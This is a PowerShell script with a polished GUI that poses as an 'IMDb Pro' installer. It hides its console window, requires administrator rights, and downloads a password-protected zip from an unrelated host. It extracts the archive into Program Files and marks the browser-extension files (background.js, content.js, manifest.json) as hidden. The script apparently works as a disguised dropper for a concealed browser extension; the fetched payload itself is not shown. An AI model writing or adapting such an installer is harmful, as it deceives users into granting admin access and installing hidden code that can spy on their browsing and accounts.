# IMDb Pro Installer - Compact & Clean Design
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Hide PowerShell console window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Create main form - MORE COMPACT
$mainForm = New-Object System.Windows.Forms.Form
$mainForm.Text = "IMDb Pro - Professional Edition"
$mainForm.Size = New-Object System.Drawing.Size(600, 550)  # More compact size
$mainForm.StartPosition = "CenterScreen"
$mainForm.BackColor = [System.Drawing.Color]::FromArgb(18, 18, 20)
$mainForm.ForeColor = [System.Drawing.Color]::White
$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$mainForm.MaximizeBox = $false

# Header Panel - COMPACT
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size(600, 70)  # Smaller header
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(28, 28, 32)
$mainForm.Controls.Add($headerPanel)

# Title - CENTERED & COMPACT
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "🎬 IMDb Pro Installer"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)  # Smaller font
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(200, 20)  # Centered
$headerPanel.Controls.Add($titleLabel)

$subtitleLabel = New-Object System.Windows.Forms.Label
$subtitleLabel.Text = "Professional Extension Suite v2.1.0"
$subtitleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 8, [System.Drawing.FontStyle]::Italic)  # Smaller font
$subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$subtitleLabel.AutoSize = $true
$subtitleLabel.Location = New-Object System.Drawing.Point(210, 45)  # Centered below title
$headerPanel.Controls.Add($subtitleLabel)

# Main Content Panel - COMPACT
$contentPanel = New-Object System.Windows.Forms.Panel
$contentPanel.Location = New-Object System.Drawing.Point(0, 70)
$contentPanel.Size = New-Object System.Drawing.Size(600, 410)
$contentPanel.BackColor = [System.Drawing.Color]::FromArgb(22, 22, 25)
$mainForm.Controls.Add($contentPanel)

# Welcome Message
$welcomeLabel = New-Object System.Windows.Forms.Label
$welcomeLabel.Text = "Welcome to IMDb Pro Installation"
$welcomeLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$welcomeLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$welcomeLabel.AutoSize = $true
$welcomeLabel.Location = New-Object System.Drawing.Point(25, 20)
$contentPanel.Controls.Add($welcomeLabel)

# Quick Info Panel
$infoPanel = New-Object System.Windows.Forms.Panel
$infoPanel.Location = New-Object System.Drawing.Point(25, 60)
$infoPanel.Size = New-Object System.Drawing.Size(550, 80)
$infoPanel.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
$infoPanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$contentPanel.Controls.Add($infoPanel)

# Info Icon
$infoIcon = New-Object System.Windows.Forms.Label
$infoIcon.Text = "💡"
$infoIcon.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 14)
$infoIcon.AutoSize = $true
$infoIcon.Location = New-Object System.Drawing.Point(15, 15)
$infoPanel.Controls.Add($infoIcon)

# Info Text
$infoText = New-Object System.Windows.Forms.Label
$infoText.Text = "This will install IMDb Pro extension to your system.`nThe installation requires administrator privileges."
$infoText.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$infoText.ForeColor = [System.Drawing.Color]::FromArgb(220, 220, 220)
$infoText.AutoSize = $true
$infoText.Location = New-Object System.Drawing.Point(50, 15)
$infoPanel.Controls.Add($infoText)

# Agreement Section
$agreementTitle = New-Object System.Windows.Forms.Label
$agreementTitle.Text = "📋 Installation Agreement"
$agreementTitle.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)  # Smaller font
$agreementTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$agreementTitle.AutoSize = $true
$agreementTitle.Location = New-Object System.Drawing.Point(25, 160)
$contentPanel.Controls.Add($agreementTitle)

# Agreement Text Box - COMPACT
$agreementTextBox = New-Object System.Windows.Forms.RichTextBox
$agreementTextBox.Location = New-Object System.Drawing.Point(25, 190)
$agreementTextBox.Size = New-Object System.Drawing.Size(550, 100)  # More compact
$agreementTextBox.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
$agreementTextBox.ForeColor = [System.Drawing.Color]::White
$agreementTextBox.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$agreementTextBox.Font = New-Object System.Drawing.Font("Segoe UI", 8)  # Smaller font
$agreementTextBox.ReadOnly = $true
$agreementTextBox.Text = @"
END-USER LICENSE AGREEMENT

By installing IMDb Pro, you agree to:
• Use this software for personal, non-commercial purposes
• Accept that this is provided 'as-is' without warranties
• Understand that developers are not responsible for any damages
• Allow anonymous usage data collection for improvement
• Not redistribute or modify without permission

Click 'I AGREE & INSTALL' to accept these terms.
"@
$contentPanel.Controls.Add($agreementTextBox)

# Agreement Checkbox
$agreementCheckbox = New-Object System.Windows.Forms.CheckBox
$agreementCheckbox.Text = "I have read and agree to the terms above"
$agreementCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
$agreementCheckbox.ForeColor = [System.Drawing.Color]::White
$agreementCheckbox.AutoSize = $true
$agreementCheckbox.Location = New-Object System.Drawing.Point(25, 300)
$agreementCheckbox.Checked = $false
$contentPanel.Controls.Add($agreementCheckbox)

# Progress Section - COMPACT
$progressTitle = New-Object System.Windows.Forms.Label
$progressTitle.Text = "📊 Installation Progress"
$progressTitle.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)  # Smaller font
$progressTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressTitle.AutoSize = $true
$progressTitle.Location = New-Object System.Drawing.Point(25, 330)
$contentPanel.Controls.Add($progressTitle)

$progressContainer = New-Object System.Windows.Forms.Panel
$progressContainer.Size = New-Object System.Drawing.Size(550, 60)  # More compact
$progressContainer.Location = New-Object System.Drawing.Point(25, 360)
$progressContainer.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
$progressContainer.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$contentPanel.Controls.Add($progressContainer)

$statusIcon = New-Object System.Windows.Forms.Label
$statusIcon.Text = "📋"
$statusIcon.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 10)  # Smaller
$statusIcon.AutoSize = $true
$statusIcon.Location = New-Object System.Drawing.Point(15, 10)
$progressContainer.Controls.Add($statusIcon)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Please accept the agreement to continue"
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)  # Smaller
$statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(40, 12)
$progressContainer.Controls.Add($statusLabel)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(15, 35)
$progressBar.Size = New-Object System.Drawing.Size(450, 15)  # More compact
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 55)
$progressBar.Visible = $false
$progressContainer.Controls.Add($progressBar)

$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = "0%"
$percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)  # Smaller
$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$percentLabel.AutoSize = $true
$percentLabel.Location = New-Object System.Drawing.Point(475, 33)
$percentLabel.Visible = $false
$progressContainer.Controls.Add($percentLabel)

# Button Panel - COMPACT
$buttonPanel = New-Object System.Windows.Forms.Panel
$buttonPanel.Location = New-Object System.Drawing.Point(0, 480)
$buttonPanel.Size = New-Object System.Drawing.Size(600, 70)
$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(28, 28, 32)
$mainForm.Controls.Add($buttonPanel)

# Compact Install Button - PERFECT SIZE
$installButton = New-Object System.Windows.Forms.Button
$installButton.Text = "🚀 I AGREE & INSTALL"
$installButton.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$installButton.ForeColor = [System.Drawing.Color]::Black
$installButton.BackColor = [System.Drawing.Color]::FromArgb(180, 180, 180)  # Gray when disabled
$installButton.Size = New-Object System.Drawing.Size(200, 35)  # Perfect compact size
$installButton.Location = New-Object System.Drawing.Point(200, 18)  # Perfectly centered
$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$installButton.FlatAppearance.BorderSize = 0
$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand
$installButton.Enabled = $false
$buttonPanel.Controls.Add($installButton)

# Update button state based on checkbox
$agreementCheckbox.Add_CheckedChanged({
    if ($agreementCheckbox.Checked) {
        $installButton.Enabled = $true
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
        $statusLabel.Text = "Ready to begin installation"
        $statusLabel.ForeColor = [System.Drawing.Color]::White
    } else {
        $installButton.Enabled = $false
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
        $statusLabel.Text = "Please accept the agreement to continue"
        $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
    }
})

# Button hover effects
$installButton.Add_MouseEnter({
    if ($installButton.Enabled) {
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(255, 215, 0)
        $installButton.Size = New-Object System.Drawing.Size(205, 37)
        $installButton.Location = New-Object System.Drawing.Point(198, 17)
    }
})

$installButton.Add_MouseLeave({
    if ($installButton.Enabled) {
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
        $installButton.Size = New-Object System.Drawing.Size(200, 35)
        $installButton.Location = New-Object System.Drawing.Point(200, 18)
    }
})

# Simple Progress Animation
function Update-Progress {
    param([string]$Message, [int]$Progress, [string]$Icon = "📌")
    
    $statusIcon.Text = $Icon
    $statusLabel.Text = $Message
    $progressBar.Value = $Progress
    $percentLabel.Text = "$Progress%"
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 500
}

# Show progress elements
function Show-ProgressElements {
    $progressBar.Visible = $true
    $percentLabel.Visible = $true
    $progressBar.Value = 0
    $percentLabel.Text = "0%"
}

# Hide progress elements
function Hide-ProgressElements {
    $progressBar.Visible = $false
    $percentLabel.Visible = $false
}

# SIMPLE WORKING INSTALLATION FUNCTION
function Start-Installation {
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        # Show progress elements
        Show-ProgressElements
        
        # Check admin rights
        Update-Progress "Checking administrator privileges..." 10 "🔍"
        
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            throw "Please run as Administrator"
        }
        
        # Create directory
        Update-Progress "Creating installation directory..." 20 "📁"
        
        if (Test-Path $installPath) {
            Remove-Item "$installPath\*" -Recurse -Force -ErrorAction SilentlyContinue
        } else {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        }
        
        # Download file
        Update-Progress "Downloading package..." 40 "📥"
        
        $tempFile = "$env:TEMP\imdb.zip"
        
        # Simple download using WebClient
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($downloadUrl, $tempFile)
        
        if (-not (Test-Path $tempFile) -or (Get-Item $tempFile).Length -eq 0) {
            throw "Download failed"
        }
        
        Update-Progress "Extracting files..." 60 "📦"
        
        # SIMPLE EXTRACTION USING 7-ZIP (approach yang sudah terbukti kerja)
        $7zPath = "$env:ProgramFiles\7-Zip\7z.exe"
        
        if (Test-Path $7zPath) {
            # Gunakan command yang sama seperti yang berhasil sebelumnya
            $arguments = @(
                "x",
                "-p$zipPassword",
                "-o`"$installPath`"",
                "-y",
                "`"$tempFile`""
            )
            
            $process = Start-Process -FilePath $7zPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow
            
            if ($process.ExitCode -ne 0) {
                throw "Extraction failed with 7-Zip"
            }
        } else {
            # Fallback to Expand-Archive
            try {
                Expand-Archive -Path $tempFile -DestinationPath $installPath -Force
            }
            catch {
                throw "7-Zip not found and Expand-Archive failed"
            }
        }
        
        # Verify extraction
        $files = Get-ChildItem $installPath -Recurse
        if ($files.Count -eq 0) {
            throw "No files were extracted"
        }
        
        Update-Progress "Finalizing installation..." 80 "🔧"
        
        # Hide files
        $filesToHide = @("background.js", "content.js", "popup.js", "styles.css", "popup.html", "manifest.json")
        foreach ($file in $filesToHide) {
            $filePath = Join-Path $installPath $file
            if (Test-Path $filePath) {
                attrib +h $filePath
            }
        }
        
        # Cleanup
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force
        }
        
        # Success
        Update-Progress "Installation completed successfully!" 100 "✅"
        
        $installButton.Text = "✅ INSTALLATION COMPLETE"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
        $installButton.Enabled = $false
        
        # Success message
        $result = [System.Windows.Forms.MessageBox]::Show(
            "🎬 IMDb Pro has been successfully installed!`n`n" +
            "Location: $installPath`n`n" +
            "Open installation folder?",
            "Installation Complete",
            [System.Windows.Forms.MessageBoxButtons]::YesNo,
            [System.Windows.Forms.MessageBoxIcon]::Information
        )
        
        if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
            Invoke-Item $installPath
        }
    }
    catch {
        # Error handling
        Update-Progress "Installation failed!" 0 "❌"
        
        $installButton.Text = "🔄 TRY AGAIN"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
        $installButton.Enabled = $true
        
        [System.Windows.Forms.MessageBox]::Show(
            "Installation failed!`n`n" +
            "Error: $($_.Exception.Message)`n`n" +
            "Make sure:`n" +
            "• You have 7-Zip installed`n" +
            "• Internet connection is working`n" +
            "• Running as Administrator",
            "Installation Error",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    }
}

# Install button click
$installButton.Add_Click({
    $installButton.Enabled = $false
    $installButton.Text = "⏳ INSTALLING..."
    $installButton.BackColor = [System.Drawing.Color]::FromArgb(255, 152, 0)
    Start-Installation
})

# Show form
[System.Windows.Forms.Application]::EnableVisualStyles()
$mainForm.ShowDialog() | Out-Null
